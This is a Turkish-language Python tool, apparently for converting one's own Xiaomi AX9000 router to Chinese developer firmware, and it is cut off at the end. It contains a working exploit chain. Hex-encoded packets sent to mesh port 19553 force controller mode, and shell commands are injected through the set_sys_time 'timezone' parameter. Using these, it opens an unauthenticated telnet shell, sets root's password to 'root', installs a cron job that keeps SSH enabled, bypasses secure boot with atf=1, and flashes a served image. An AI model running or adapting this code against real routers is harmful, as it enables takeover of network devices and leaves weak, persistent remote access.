#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Xiaomi AX9000 (RA70) Global -> Cin Dev 1.0.140 Gecis Araci
Gelistirici: Google DeepMind & Antigravity
Bootloader (SBL1/APPSBL) Korumali - Cift Yuva Guvenligi
"""

import os
import sys
import time
import socket
import ssl
import hashlib
import random
import re
import json
import threading
import http.server
import socketserver
import requests
import datetime

# Windows Konsol Uyumlulugu
if sys.platform == 'win32':
    try:
        import ctypes
        ctypes.windll.kernel32.SetConsoleOutputCP(65001)
        ctypes.windll.kernel32.SetConsoleCP(65001)
    except Exception:
        pass
    os.system('')

EXPECTED_MD5 = "dabb7639c015e4e93457e9e193315a27"
EXPECTED_SIZE = 44040192

# --- Renkli Konsol Destegi ---
def color(text, code):
    return f"\033[{code}m{text}\033[0m"

def c_green(text): return color(text, "1;32")
def c_red(text): return color(text, "1;31")
def c_yellow(text): return color(text, "1;33")
def c_cyan(text): return color(text, "1;36")
def c_bold(text): return color(text, "1")

# --- Payload Konumlandirma ---
def get_payload_path():
    # 1. PyInstaller Bundle (_MEIPASS)
    if hasattr(sys, '_MEIPASS'):
        p = os.path.join(sys._MEIPASS, "root_1.0.140.ubi")
        if os.path.isfile(p):
            return p
    # 2. Calisilan dizin (Next to exe)
    exe_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
    p1 = os.path.join(exe_dir, "root_1.0.140.ubi")
    if os.path.isfile(p1):
        return p1
    # 3. Mevcut calisma dizini
    if os.path.isfile("root_1.0.140.ubi"):
        return os.path.abspath("root_1.0.140.ubi")
    return None

# --- Raw Socket Telnet Yonetimi (Python 3.13 Uyumlu) ---
class SimpleTelnet:
    def __init__(self, host, port=23, timeout=5):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(timeout)
        self.sock.connect((host, port))

    def read_until(self, expected_bytes, timeout=10):
        self.sock.settimeout(0.5)
        out = b""
        start = time.time()
        while time.time() - start < timeout:
            try:
                chunk = self.sock.recv(4096)
                if not chunk:
                    break
                clean_chunk = bytearray()
                i = 0
                while i < len(chunk):
                    if chunk[i] == 255 and i + 2 < len(chunk):
                        i += 3
                    elif chunk[i] == 255 and i + 1 < len(chunk):
                        i += 2
                    else:
                        clean_chunk.append(chunk[i])
                        i += 1
                out += bytes(clean_chunk)
                if expected_bytes in out:
                    break
            except socket.timeout:
                continue
            except Exception:
                break
        return out

    def read_eager(self):
        self.sock.settimeout(0.2)
        out = b""
        while True:
            try:
                chunk = self.sock.recv(4096)
                if not chunk: break
                out += chunk
            except Exception:
                break
        return out

    def write(self, data):
        if isinstance(data, str):
            data = data.encode('utf-8')
        self.sock.sendall(data)

    def exec_cmd(self, cmd, timeout=30):
        self.read_eager()
        self.write(cmd + "\r\n")
        out = b""
        start = time.time()
        self.sock.settimeout(1.0)
        while time.time() - start < timeout:
            try:
                chunk = self.sock.recv(4096)
                if not chunk: break
                out += chunk
                if b"# " in out:
                    break
            except socket.timeout:
                continue
            except Exception:
                break
        return out.decode('utf-8', errors='ignore')

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass

# --- Xiaomi Gateway & Exploit Yoneticisi ---
class XiaomiGateway:
    def __init__(self, ip="192.168.31.1", password=""):
        self.ip = ip
        self.password = password
        self.stok = None
        self.device_info = {}
        self.mac_address = None
        self.nonce_key = None

    def detect(self):
        try:
            r = requests.get(f"http://{self.ip}/cgi-bin/luci/web", timeout=4)
            page = r.text
            hw = re.findall(r'hardware = \'(.*?)\'', page) or re.findall(r'hardwareVersion: \'(.*?)\'', page)
            self.device_info['hardware'] = hw[0].upper() if hw else 'Bilinmiyor'
            rom = re.search(r'romVersion: \'(.*?)\'', page)
            self.device_info['rom_version'] = rom.group(1).strip() if rom else 'Bilinmiyor'
            mac = re.search(r'var deviceId = \'(.*?)\'', page)
            self.mac_address = mac.group(1) if mac else None
            self.device_info['mac'] = self.mac_address
            key = re.search(r'key: \'(.*)\',', page)
            self.nonce_key = key.group(1) if key else None
            return True
        except Exception:
            return False

    def login(self):
        if not self.nonce_key or not self.mac_address:
            if not self.detect():
                return False, "Modeme erisilemedi!"

        nonce = f"0_{self.mac_address}_{int(time.time())}_{random.randint(1000, 10000)}"
        account_str = hashlib.sha1((self.password + self.nonce_key).encode('utf-8')).hexdigest()
        pwd_hash = hashlib.sha1((nonce + account_str).encode('utf-8')).hexdigest()
        post_data = {
            'username': 'admin',
            'password': pwd_hash,
            'logtype': '2',
            'nonce': nonce
        }
        try:
            r = requests.post(f"http://{self.ip}/cgi-bin/luci/api/xqsystem/login", data=post_data, timeout=5)
            res = r.json()
            if res.get('code') == 0 and 'token' in res:
                self.stok = res['token']
                return True, self.stok
            return False, f"Giris basarisiz (Kod: {res.get('code')})"
        except Exception as e:
            return False, str(e)

    def get_netmode(self):
        if not self.stok: return -1
        try:
            r = requests.get(f"http://{self.ip}/cgi-bin/luci/;stok={self.stok}/api/xqnetwork/get_netmode", timeout=4)
            res = r.json()
            if res.get('code') == 0:
                return int(res.get('netmode', -1))
        except Exception:
            pass
        return -1

    def trigger_mesh_exploit(self):
        print(c_cyan("[-] Mesh Port 19553 uzerinden netmode=4 tetikleniyor..."))
        try:
            sslctx = ssl.create_default_context()
            sslctx.check_hostname = False
            sslctx.verify_mode = ssl.CERT_NONE
            sslctx.set_ciphers('DEFAULT')
            tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock = sslctx.wrap_socket(tcp_sock, server_hostname=self.ip)
            sock.connect((self.ip, 19553))

            p1 = bytes.fromhex('100100a3000438633a64653a66393a62663a35643a6236000038633a64653a66393a62663a35643a6237000061646435353662636461303730380000503151527567767a6d78746b35502f70316b2b46566a724a4c716d6568494546424a6563477062516a76383d000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000033433a43443a35373a32323a31433a36310000')
            p2 = bytes.fromhex('10010020000538633a64653a66393a62663a35643a6236000038633a64653a66393a62663a35643a623700000100000000000000000000000000000000000000000000000000000000000000')
            p3 = bytes.fromhex('10010020000738633a64653a66393a62663a35643a6236000038633a64653a66393a62663a35643a62370000017265637620636f6e6669672073796e6320636f72726563746c792e0a000000')

            sock.sendall(p1)
            sock.sendall(p2)
            sock.sendall(p3)
            sock.close()
        except Exception as e:
            print(c_yellow(f"[!] SSL Mesh port uyarisi: {e}"))

        # Netmode kontrol
        for _ in range(8):
            time.sleep(1)
            nm = self.get_netmode()
            if nm == 4:
                print(c_green("[+] netmode=4 (Mesh Kontrolcu Modu) basariyla aktif edildi!"))
                return True
        return False

    def exec_mesh_cmd(self, cmd):
        if not self.stok: return None
        url = f"http://{self.ip}/cgi-bin/luci/;stok={self.stok}/api/misystem/set_sys_time"
        params = {'timezone': f" ' ; {cmd} ; "}
        try:
            r = requests.get(url, params=params, timeout=5)
            return r.json()
        except Exception:
            return None

    def unlock_telnet_ssh(self, root_pwd="root"):
        print(c_cyan("[-] Dropbear SSH ve Telnet servisleri aciliyor..."))
        cmds = [
            f"(echo {root_pwd}; sleep 1; echo {root_pwd}) | passwd root",
            "sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear",
            "nvram set ssh_en=1; nvram set telnet_en=1; nvram set uart_en=1; nvram set boot_wait=on; nvram commit",
            "/etc/init.d/dropbear enable",
            "/etc/init.d/dropbear restart",
            "/usr/sbin/telnetd -l /bin/sh",
            "uci set xqnetwork.common.netmode=0; uci commit xqnetwork"
        ]
        for c in cmds:
            self.exec_mesh_cmd(c)
            time.sleep(0.3)
        time.sleep(1.5)

# --- Tek Dosyali HTTP Sunucusu ---
class SingleFileServer:
    def __init__(self, file_path, port=8998):
        self.file_path = file_path
        self.port = port
        self.httpd = None
        self.thread = None

    def start(self):
        class Handler(http.server.BaseHTTPRequestHandler):
            fpath = self.file_path
            def do_GET(self_inner):
                if self_inner.path in ["/root_1.0.140.ubi", "/payload.ubi"]:
                    try:
                        size = os.path.getsize(self.fpath)
                        self_inner.send_response(200)
                        self_inner.send_header("Content-Type", "application/octet-stream")
                        self_inner.send_header("Content-Length", str(size))
                        self_inner.end_headers()
                        with open(self.fpath, "rb") as f:
                            while chunk := f.read(65536):
                                self_inner.wfile.write(chunk)
                    except Exception:
                        self_inner.send_error(500)
                else:
                    self_inner.send_error(404)
            def log_message(self_inner, format, *args):
                pass

        self.httpd = socketserver.TCPServer(("", self.port), Handler)
        self.thread = threading.Thread(target=self.httpd.serve_forever)
        self.thread.daemon = True
        self.thread.start()

    def stop(self):
        if self.httpd:
            try:
                self.httpd.shutdown()
                self.httpd.server_close()
            except Exception:
                pass

def get_local_lan_ip(target_ip="192.168.31.1"):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((target_ip, 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "192.168.31.2"

def test_port(ip, port, timeout=2):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        r = s.connect_ex((ip, port))
        s.close()
        return r == 0
    except Exception:
        return False

# --- ANA FLASH ISLEMI ---
def do_flash_process(ip, web_pass):
    print("\n" + "="*68)
    print(c_bold("       XIAOMI AX9000 -> CIN GELISTIRICI (1.0.140 DEV) GECISI"))
    print("="*68)

    payload_path = get_payload_path()
    if not payload_path or not os.path.isfile(payload_path):
        print(c_red("\n[HATA] 'root_1.0.140.ubi' imaj dosyasi bulunamadi!"))
        print(c_yellow("Lutfen 'root_1.0.140.ubi' dosyasini programin yanina koyun."))
        return False

    # Check payload MD5
    print(c_cyan("[1/6] Imaj dosyasi butunlugu dogrulaniyor..."))
    with open(payload_path, 'rb') as f:
        md5_calc = hashlib.md5(f.read()).hexdigest()
    if md5_calc.lower() != EXPECTED_MD5.lower():
        print(c_red(f"[HATA] Imaj MD5 uyumsuz! ({md5_calc} != {EXPECTED_MD5})"))
        return False
    print(c_green(f"[+] Imaj dosyasi dogrulandi (MD5: {EXPECTED_MD5})"))

    print(c_yellow("\n" + "="*68))
    print(c_bold(c_yellow("  DIKKAT: AĞ VE KULLANICI AYARLARI SIFIRLANMASI HAKKINDA BILGI")))
    print("="*68)
    print(c_yellow("Global surumden Cin Gelistirici surumune gecerken eski yapilandirma"))
    print(c_yellow("dosyalarinin cakisip cihazi kitlememesi icin Wi-Fi adi ve sifreniz"))
    print(c_yellow("fabrika ayarlarina sifirlanacaktir. Gecis bittiginde ilk kurulumu yapmaniz gerekir."))
    ans = input(c_bold("\nYukseltme islemine devam etmek istiyor musunuz? [E/H]: ")).strip().lower()
    if ans not in ['e', 'evet', 'y', 'yes']:
        print(c_red("Islem kullanici tarafindan iptal edildi."))
        return False

    # Gateway login & exploit
    gw = XiaomiGateway(ip, web_pass)
    telnet_ok = test_port(ip, 23)

    if not telnet_ok:
        print(c_cyan("\n[2/6] Yonetici paneline baglaniliyor..."))
        if not gw.detect():
            print(c_red(f"[HATA] {ip} adresindeki modeme ulasilamadi. Kablo baglantinizi kontrol edin."))
            return False
        
        # Verify hardware is RA70
        hw_ver = gw.device_info.get('hardware', '').upper()
        if hw_ver != 'RA70' and hw_ver != 'BILINMIYOR':
            print(c_red(f"[HATA] Tespit edilen cihaz ({hw_ver}) bir Xiaomi AX9000 (RA70) degil!"))
            print(c_red("Yanlis cihaza ROM yazilmasini onlemek icin islem durduruldu."))
            return False
        print(c_green(f"[+] Modem Tespit Edildi: {hw_ver} (Surum: {gw.device_info.get('rom_version')})"))

        ok, msg = gw.login()
        if not ok:
            print(c_red(f"[HATA] Web arayuzune giris yapilamadi: {msg}"))
            print(c_yellow("Ipucu: Belirlediginiz sifrenin dogru oldugundan emin olun."))
            return False
        print(c_green(f"[+] Giris basarili! (STOK: {msg[:10]}...)"))

        print(c_cyan("[3/6] Guvenlik acigi (Mesh Exploit) tetikleniyor..."))
        gw.trigger_mesh_exploit()
        gw.unlock_telnet_ssh("root")
        time.sleep(2)
    else:
        print(c_green("\n[2/6] Telnet portu (23) zaten acik, exploit adimi atlaniyor."))

    # Telnet connection test
    print(c_cyan("[4/6] Modemin konsoluna (Telnet) baglaniliyor..."))
    tn = None
    for attempt in range(5):
        try:
            tn = SimpleTelnet(ip, 23, timeout=4)
            # Try login
            data = tn.read_until(b"login: ", timeout=3)
            if b"login: " in data:
                tn.write("root\r\n")
                pdata = tn.read_until(b"Password: ", timeout=3)
                if b"Password: " in pdata:
                    tn.write("root\r\n")
            # Clear welcome
            tn.read_until(b"# ", timeout=4)
            break
        except Exception:
            time.sleep(1)

    if not tn:
        print(c_red("[HATA] Telnet konsoluna baglanilamadi!"))
        return False
    print(c_green("[+] Telnet kabugu basariyla acildi!"))

    # SIKI DONANIM DOGRULAMASI (Model kesinlikle RA70 mi?)
    model_raw = tn.exec_cmd("cat /proc/xiaoqiang/model 2>/dev/null || nvram get model", timeout=5)
    model_lines = [l.strip() for l in model_raw.splitlines() if l.strip() and not l.startswith('#') and 'cat ' not in l and 'nvram ' not in l]
    model_val = model_lines[0] if model_lines else ""
    if not re.search(r'^\s*RA70\s*$', model_val, re.IGNORECASE):
        print(c_red(f"\n[HATA] Bu cihaz bir Xiaomi AX9000 (RA70) degil!"))
        print(c_red(f"Tespit Edilen Model: '{model_val}' (Beklenen: 'RA70')"))
        print(c_red("Yanlis cihaza yanlis ROM yazilmasini onlemek amaciyla islem DURDURULDU."))
        tn.close()
        return False
    print(c_green(f"[+] Donanim Modeli Guvenlik Dogrulamasi: Xiaomi AX9000 (Tam Eslesme: {model_val.upper()}) OK"))

    # YEDEKLEME: NVRAM ve BData yedeklerinin bilgisayara indirilmesi
    backup_folder = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), "Yedekler")
    os.makedirs(backup_folder, exist_ok=True)
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    print(c_cyan(f"[-] Guvenlik icin modemin NVRAM ve BData yedekleri bilgisayara indiriliyor..."))
    nvram_data = tn.exec_cmd("nvram show", timeout=10)
    bdata_data = tn.exec_cmd("bdata show", timeout=10)

    nvram_path = os.path.join(backup_folder, f"nvram_yedek_{ts}.txt")
    bdata_path = os.path.join(backup_folder, f"bdata_yedek_{ts}.txt")

    with open(nvram_path, "w", encoding="utf-8") as f:
        f.write(nvram_data)
    with open(bdata_path, "w", encoding="utf-8") as f:
        f.write(bdata_data)

    if os.path.getsize(nvram_path) < 100 or os.path.getsize(bdata_path) < 10:
        print(c_red("[HATA] Yedek dosyalari bilgisayara duzgun kaydedilemedi!"))
        tn.close()
        return False
    print(c_green(f"[+] Yedekler bilgisayara basariyla kaydedildi ve boyutlari dogrulandi:"))
    print(c_green(f"    -> {nvram_path} ({os.path.getsize(nvram_path)} bayt)"))
    print(c_green(f"    -> {bdata_path} ({os.path.getsize(bdata_path)} bayt)"))

    # DİNAMİK /proc/mtd VE SIKI YUVA (SLOT) KONTROLÜ
    mtd_out = tn.exec_cmd("cat /proc/mtd", timeout=5)
    m_rootfs0 = re.search(r'(mtd\d+):\s+[0-9a-fA-F]+\s+[0-9a-fA-F]+\s+"rootfs"', mtd_out)
    m_rootfs1 = re.search(r'(mtd\d+):\s+[0-9a-fA-F]+\s+[0-9a-fA-F]+\s+"rootfs_1"', mtd_out)

    if not m_rootfs0 or not m_rootfs1:
        print(c_red("[HATA] /proc/mtd icinde 'rootfs' ve 'rootfs_1' bolumleri tespit edilemedi!"))
        print(c_red(f"MTD Tablosu:\n{mtd_out.strip()}"))
        tn.close()
        return False

    mtd_slot0 = m_rootfs0.group(1)   # örn: mtd21
    mtd_slot1 = m_rootfs1.group(1)   # örn: mtd22

    cmdline = tn.exec_cmd("cat /proc/cmdline", timeout=5)
    print(c_cyan(f"[-] Aktif Sistem Parametreleri: {cmdline.strip()[:60]}..."))

    has_rootfs1 = bool(re.search(r'\bubi\.mtd=rootfs_1\b', cmdline))
    has_rootfs0 = bool(re.search(r'\bubi\.mtd=rootfs\b(?!_)', cmdline))

    if has_rootfs1 and not has_rootfs0:
        active_slot = 1
        target_slot = 0
        target_mtd = mtd_slot0
        slot_name = f"1. Yuva (rootfs / {target_mtd})"
    elif has_rootfs0 and not has_rootfs1:
        active_slot = 0
        target_slot = 1
        target_mtd = mtd_slot1
        slot_name = f"2. Yuva (rootfs_1 / {target_mtd})"
    else:
        print(c_red("\n[HATA] Aktif yuva /proc/cmdline uzerinden guvenli sekilde tespit edilemedi!"))
        print(c_red(f"cmdline ciktisi: '{cmdline.strip()}'"))
        print(c_red("Calisan yuvaya yanlislikla yazma riskini onlemek icin islem DURDURULDU."))
        tn.close()
        return False

    print(c_green(f"[+] Aktif Calisan Yuva: {active_slot}. Yuva"))
    print(c_yellow(f"[*] Hedef Yazim Yuvasi : {slot_name}"))
    print(c_yellow(f"[*] Aktif calisan yuva KORUNACAK, bosta duran {target_mtd} yuvasina yazilacak!"))

    # Start HTTP server
    local_ip = get_local_lan_ip(ip)
    server = SingleFileServer(payload_path, port=8998)
    server.start()
    print(c_cyan(f"\n[-] Imaj aktarimi icin dahili HTTP sunucu baslatildi ({local_ip}:8998)..."))

    # Download UBI into router
    print(c_cyan("[5/6] 1.0.140 Dev imaji modeme aktariliyor (yaklasik 10-15 sn)..."))
    dl_cmd = f"curl -s http://{local_ip}:8998/root_1.0.140.ubi -o /tmp/root_1.0.140.ubi || wget -q -O /tmp/root_1.0.140.ubi http://{local_ip}:8998/root_1.0.140.ubi"
    tn.exec_cmd(dl_cmd, timeout=60)
    server.stop()

    # Check router MD5
    print(c_cyan("[-] Modemdeki dosya butunlugu (MD5) kontrol ediliyor..."))
    md5_router = tn.exec_cmd("md5sum /tmp/root_1.0.140.ubi", timeout=25)
    if EXPECTED_MD5 not in md5_router:
        print(c_red(f"[HATA] Modemdeki dosya MD5 dogrulamasi basarisiz! Cikti: {md5_router.strip()}"))
        tn.exec_cmd("rm -f /tmp/root_1.0.140.ubi")
        tn.close()
        return False
    print(c_green(f"[+] Modemdeki imaj MD5 dogrulamasi %100 BASARILI! ({EXPECTED_MD5})"))

    # Flash to target mtd WITH STRICT RETURN CODE AND OUTPUT CHECK
    print(c_yellow(f"\n>>> DIKKAT: {target_mtd} FORMATLANIYOR VE CIN DEV 1.0.140 YAZILIYOR... <<<"))
    print(c_cyan("[-] Bu islem yaklasik 30-45 saniye surecektir, lutfen bekleyin..."))
    
    flash_cmd = f"ubiformat /dev/{target_mtd} -y -f /tmp/root_1.0.140.ubi; echo 'UBI_EXIT_STATUS='$?"
    flash_res = tn.exec_cmd(flash_cmd, timeout=180)

    exit_match = re.search(r'UBI_EXIT_STATUS=(\d+)', flash_res)
    exit_code = int(exit_match.group(1)) if exit_match else -1

    if exit_code != 0 or "error" in flash_res.lower() or "flashing eraseblock" not in flash_res.lower():
        print(c_red(f"\n[KRITIK HATA] Ubiformat yazma islemi BASARISIZ oldu! (Exit code: {exit_code})"))
        print(c_red(f"Modem Konsol Ciktisi:\n{flash_res.strip()[-300:]}"))
        print(c_yellow("\n[GUVENLIK KORUMASI] Yuva degistirme islemi TAMAMEN IPTAL EDILDI."))
        print(c_yellow("Modeminizin calisan aktif sistemi korunmustur. Cihazi yeniden baslatirsaniz mevcut surum acilacaktir."))
        tn.exec_cmd("rm -f /tmp/root_1.0.140.ubi")
        tn.close()
        return False

    print(c_green(f"[+] Ubiformat yazma tamamlandi (Exit code: {exit_code})."))

    # DONANIM GERİ OKUMA VE DOĞRULAMA (HARDWARE READ-BACK VERIFICATION)
    mtd_num = target_mtd.replace("mtd", "")
    print(c_cyan(f"[-] Yazilan {target_mtd} yuvasi UBI baglantisi kurularak dogrulaniyor (ubiattach)..."))
    
    tn.exec_cmd(f"ubidetach -m {mtd_num} 2>/dev/null", timeout=5)
    attach_res = tn.exec_cmd(f"ubiattach -m {mtd_num} -d 2 2>&1", timeout=15)
    ubinfo_res = tn.exec_cmd("ubinfo /dev/ubi2 2>&1", timeout=10)
    tn.exec_cmd(f"ubidetach -m {mtd_num} 2>/dev/null", timeout=10)

    vol_match = re.search(r'Volumes count:\s*(\d+)', ubinfo_res)
    vol_count = int(vol_match.group(1)) if vol_match else 0

    if vol_count < 2 or "ubi2" not in ubinfo_res or "kernel" not in ubinfo_res or "ubi_rootfs" not in ubinfo_res:
        print(c_red(f"\n[KRITIK HATA] Yazilan {target_mtd} UBI dosya sistemi dogrulamasindan gecemedi!"))
        print(c_red(f"HATA: Beklenen 'kernel' ve 'ubi_rootfs' bolumleri UBI icinde tespit edilemedi (Volume sayisi: {vol_count})!"))
        print(c_red(f"ubiattach / ubinfo ciktisi:\n{attach_res}\n{ubinfo_res}"))
        print(c_yellow("\n[GUVENLIK KORUMASI] Yuva degistirme IPTAL EDILDI. Aktif calisan yuvaniz korunuyor."))
        tn.exec_cmd("rm -f /tmp/root_1.0.140.ubi")
        tn.close()
        return False

    print(c_green(f"[+] {target_mtd} UBI dosya sistemi (NAND kernel + ubi_rootfs, {vol_count} Volume) dogrulandi!"))

    # Configure ATF=1 and NVRAM variables
    print(c_cyan("[6/7] Qualcomm Secure Boot baypasi (atf=1) ve Cin NVRAM parametreleri yaziliyor..."))
    nvram_cmds = [
        "nvram set atf=1",
        "nvram set boot_wait=on",
        "nvram set bootdelay=3",
        "nvram set uart_en=1",
        "nvram set telnet_en=1",
        "nvram set ssh_en=1",
        "nvram set CountryCode=CN",
        f"nvram set flag_boot_rootfs={target_slot}",
        f"nvram set flag_last_success={target_slot}",
        "nvram set flag_boot_success=1",
        "nvram set flag_try_sys1_failed=0",
        "nvram set flag_try_sys2_failed=0",
        "nvram set flag_format_overlay=1",
        "nvram commit",
        "bdata set CountryCode=CN 2>/dev/null || true",
        "bdata set telnet_en=1 2>/dev/null || true",
        "bdata set ssh_en=1 2>/dev/null || true",
        "bdata set uart_en=1 2>/dev/null || true",
        "bdata set boot_wait=on 2>/dev/null || true",
        "bdata commit 2>/dev/null || true",
        "rm -f /tmp/root_1.0.140.ubi",
        "sync; sync"
    ]
    for nc in nvram_cmds:
        tn.exec_cmd(nc, timeout=5)

    verify = tn.exec_cmd(f"nvram get flag_boot_rootfs; nvram get atf; nvram get CountryCode", timeout=5)
    print(c_green(f"[+] NVRAM Dogrulama: {verify.strip().replace(chr(10), ' | ')}"))

    print(c_cyan("\n[7/7] Modem yeniden baslatiliyor ve acilis dogrulaniyor..."))
    tn.write("reboot\r\n")
    time.sleep(1)
    tn.close()

    print(c_yellow("[-] Modem yeniden baslatildi. Acilis yaklasik 2-3 dakika surecektir."))
    print(c_yellow("[-] Isiklar maviye donene kadar modeme dokunmayin.\n"))

    reboot_success = False
    verified_rom = "Bilinmiyor"
    start_wait = time.time()
    time.sleep(25)  # initial wait for router to go down

    while time.time() - start_wait < 240:
        elapsed = int(time.time() - start_wait)
        sys.stdout.write(f"\r[-] Modem acilisi ve servisler bekleniyor ({elapsed} sn gecti)... ")
        sys.stdout.flush()
        time.sleep(4)
        try:
            r = requests.get(f"http://{ip}/cgi-bin/luci/web", timeout=3)
            if r.status_code == 200:
                rom_m = re.search(r"romVersion:\s*'([^']+)'", r.text)
                if rom_m:
                    verified_rom = rom_m.group(1).strip()
                reboot_success = True
                break
        except Exception:
            pass

    print()
    if reboot_success and "1.0.140" in verified_rom:
        print(c_bold(c_green("\n" + "="*68)))
        print(c_bold(c_green("  TEBRIKLER! MODEM ACILDI VE YENI SURUM BASARIYLA DOGRULANDI!")))
        print(c_bold(c_green("="*68)))
        print(c_green(f"[+] Dogrulanan Aktif Surum : {verified_rom} (Cin Gelistirici)"))
        print(c_green(f"[+] Acilan Yuva           : {slot_name}"))
        print(c_green(f"[+] Web Yonetim Adresi    : http://{ip}"))
        print(c_yellow("""
- Modeminiz artik resmi Cin Gelistirici (1.0.140 Dev) surumuyle calisiyor!
- Tarayicinizdan 192.168.31.1 adresine giderek ilk Wi-Fi kurulumunu yapabilirsiniz.
- Kalici SSH kurmak icin ana menuden [2] secenegini calistirabilirsiniz.
"""))
    elif reboot_success:
        print(c_bold(c_red("\n" + "="*68)))
        print(c_bold(c_red("  UYARI: MODEM HEDEF SURUMLE ACILMADI!")))
        print(c_bold(c_red("="*68)))
        print(c_yellow(f"[!] Tespit Edilen Surum : {verified_rom} (Beklenen: 1.0.140)"))
        print(c_yellow("Modem yeni surum yerine eski yedek sistemden baslatilmis olabilir."))
        print(c_yellow("Lutfen baglantilari kontrol edip araci tekrar calistirin."))
    else:
        print(c_yellow("\n[!] Modem yaniti henuz alinamadi. On LED'ler maviye donene kadar bekleyin."))
        print(c_yellow(f"    LED'ler maviye donunce tarayicinizdan http://{ip} adresine ulasabilirsiniz."))

    return True

# --- KALICI ROOT / SSH AYARLAMA ---
def do_setup_ssh(ip, web_pass):
    print("\n" + "="*68)
    print(c_bold("       KALICI ROOT SSH & DROPBEAR AKTIVASYONU (PORT 22)"))
    print("="*68)
    gw = XiaomiGateway(ip, web_pass)
    if not gw.detect():
        print(c_red(f"[HATA] {ip} adresindeki modeme ulasilamadi."))
        return False

    ok, msg = gw.login()
    if not ok:
        print(c_red(f"[HATA] Web arayuzune giris yapilamadi: {msg}"))
        return False
    print(c_green(f"[+] Web arayuzune giris basarili!"))

    print(c_cyan("[-] Mesh exploit tetikleniyor..."))
    gw.trigger_mesh_exploit()
    gw.unlock_telnet_ssh("root")
    print(c_green("[+] Root sifresi 'root' olarak ayarlandi, Dropbear SSH (Port 22) ve Telnet (Port 23) baslatildi!"))

    # Permanent patch
    try:
        tn = SimpleTelnet(ip, 23, timeout=5)
        tn.read_until(b"login: ", timeout=3)
        tn.write("root\r\n")
        tn.read_until(b"Password: ", timeout=3)
        tn.write("root\r\n")
        tn.read_until(b"# ", timeout=4)
        patch_cmd = (
            "mkdir -p /etc/crontabs/patches && "
            "cat << 'EOF' > /etc/crontabs/patches/ssh_patch.sh\n"
            "#!/bin/sh\n"
            "nvram set ssh_en=1\n"
            "nvram set telnet_en=1\n"
            "nvram commit\n"
            "if grep -q '= \"release\"' /etc/init.d/dropbear ; then\n"
            "    sed -i 's/= \"release\"/= \"XXXXXX\"/g' /etc/init.d/dropbear\n"
            "fi\n"
            "/etc/init.d/dropbear enable\n"
            "/etc/init.d/dropbear start 2>/dev/null\n"
            "EOF\n"
            "chmod +x /etc/crontabs/patches/ssh_patch.sh && "
            "/etc/crontabs/patches/ssh_patch.sh && "
            "grep -q 'ssh_patch.sh' /etc/crontabs/root 2>/dev/null || echo '*/1 * * * * /etc/crontabs/patches/ssh_patch.sh >/dev/null 2>&1' >> /etc/crontabs/root"
        )
        tn.exec_cmd(patch_cmd, timeout=10)
        tn.close()
        print(c_green("[+] Kalici SSH Cron yamasi (/etc/crontabs/patches/ssh_patch.sh) kuruldu!"))
        print(c_green("[+] Artik modem her yeniden basladiginda SSH otomatik acik kalacaktir."))
    except Exception as e:
        print(c_yellow(f"[!] Telnet otomatik yama uyarisi: {e}"))
    return True

# --- MODEM BILGILERI KONTROL ---
def do_check_info(ip):
    print("\n" + "="*68)
    print(c_bold("                  MODEM DURUM VE BILGI KONTROLU"))
    print("="*68)
    gw = XiaomiGateway(ip)
    if not gw.detect():
        print(c_red(f"[HATA] {ip} adresindeki modeme ulasilamadi."))
        return

    print(f"Modem Modeli       : {c_green(gw.device_info.get('hardware', 'Bilinmiyor'))}")
    print(f"Yazilim Surumu     : {c_green(gw.device_info.get('rom_version', 'Bilinmiyor'))}")
    print(f"MAC Adresi         : {c_cyan(gw.device_info.get('mac', 'Bilinmiyor'))}")
    
    p80 = test_port(ip, 80)
    p22 = test_port(ip, 22)
    p23 = test_port(ip, 23)
    p19553 = test_port(ip, 19553)

    print(f"Web Portu (80)     : {c_green('ACIK') if p80 else c_red('KAPALI')}")
    print(f"SSH Portu (22)     : {c_green('ACIK (Kalici Root)') if p22 else c_yellow('KAPALI')}")
    print(f"Telnet Portu (23)  : {c_green('ACIK') if p23 else c_yellow('KAPALI')}")
    print(f"Mesh Portu (19553) : {c_green('ACIK (Exploit Uyumlu)') if p19553 else c_red('KAPALI')}")

# --- ANA MENU ---
def main():
    while True:
        print("\n" + "="*68)
        print(c_bold(c_cyan("       XIAOMI AX9000 (RA70) GELISTIRICI DONUSTURME ARACI")))
        print(c_bold("         Qualcomm Secure Boot Korumali - Cift Yuva Guvenligi"))
        print("="*68)
        print("  [1] Modemi Cin Gelistirici (1.0.140 Develop) Surumune Yukselt")
        print("  [2] Cin Surumunde Kalici Root SSH Kur (Kullanici: root / Sifre: root)")
        print("  [3] Modem Durumunu ve Acik Portlari Kontrol Et")
        print("  [0] Cikis")
        print("="*68)

        secim = input(c_bold("Lutfen bir islem secin [0-3]: ")).strip()
        if secim == '0':
            print("\nCikis yapiliyor...")
            break
        elif secim == '1':
            ip = input("\nModem IP adresi [Varsayilan: 192.168.31.1]: ").strip() or "192.168.31.1"
            pwd = input("Modem Web Yonetici Sifresi: ").strip()
            if not pwd:
                print(c_red("[!] Web sifresi bos birakilamaz!"))
                continue
            do_flash_process(ip, pwd)
            input("\nMenuye donmek icin Enter'a basin...")
        elif secim == '2':
            ip = input("\nModem IP adresi [Varsayilan: 192.168.31.1]: ").strip() or "192.168.31.1"
            pwd = input("Modem Web Yonetici Sifresi: ").strip()
            if not pwd:
                print(c_red("[!] Web sifresi bos birakilamaz!"))
                continue
            do_setup_ssh(ip, pwd)
            input("\nMenuye donmek icin Enter'a basin...")
        elif secim == '3':
            ip = input("\nModem IP adresi [Varsayilan: 192.168.31.1]: ").strip() or "192.168.31.1"
            do_check_info(ip)
            input("\nMenuye donmek icin Enter'a basin...")
        else:
            print(c_red("\nGecersiz secim, lutfen tekrar deneyin."))

if __name__ == '__main__':
    try:
        main()
    except (KeyboardInterrupt, EOFError):
        sys.exit(0)
    except Exception as e:
